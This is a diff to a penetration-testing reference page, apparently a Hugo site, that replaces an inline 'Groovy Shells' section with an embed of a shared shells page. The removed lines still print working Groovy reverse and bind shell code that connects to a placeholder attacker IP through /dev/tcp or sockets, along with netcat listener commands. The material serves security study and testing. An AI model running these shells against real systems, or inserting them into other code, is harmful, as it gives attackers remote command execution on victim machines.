@@ -185,59 +185,7 @@ Typically uses Groovy (language) to execute commands:
 println "cmd.exe /c <COMMAND>".execute().text
 ```
 
-### Groovy Shells
-
-#### Linux
-
-##### Reverse
-
-```bash
-nc -lvnp <PORT>
-```
-
-```groovy
-r = Runtime.getRuntime()
-p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<ATTACKER_IP>/<PORT>;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
-p.waitFor()
-```
-
-#### Windows
-
-##### Bind
-
-```groovy
-int port=<PORT>;
-String cmd="cmd.exe";
-ServerSocket ss=new ServerSocket(port);
-Socket s=ss.accept();
-Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
-InputStream pi=p.getInputStream(),si=s.getInputStream();
-OutputStream po=p.getOutputStream(),so=s.getOutputStream();
-while(!s.isClosed()){
-  while(pi.available()>0)so.write(pi.read());
-  while(si.available()>0)po.write(si.read());
-  so.flush();po.flush();Thread.sleep(50);
-  try{p.exitValue();break;}catch(Exception e){}
-};
-p.destroy();s.close();ss.close();
-```
-
-```bash
-nc -nv <TARGET> <PORT>
-```
-
-##### Reverse
-
-```bash
-nc -lvnp <PORT>
-```
-
-```groovy
-String host="<ATTACKER_IP>";
-int port=<PORT>;
-String cmd="cmd.exe";
-Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
-```
+{{< embed-section page="Docs/5 - Exploitation/shells" header="groovy" >}}
 
 ## Splunk
 
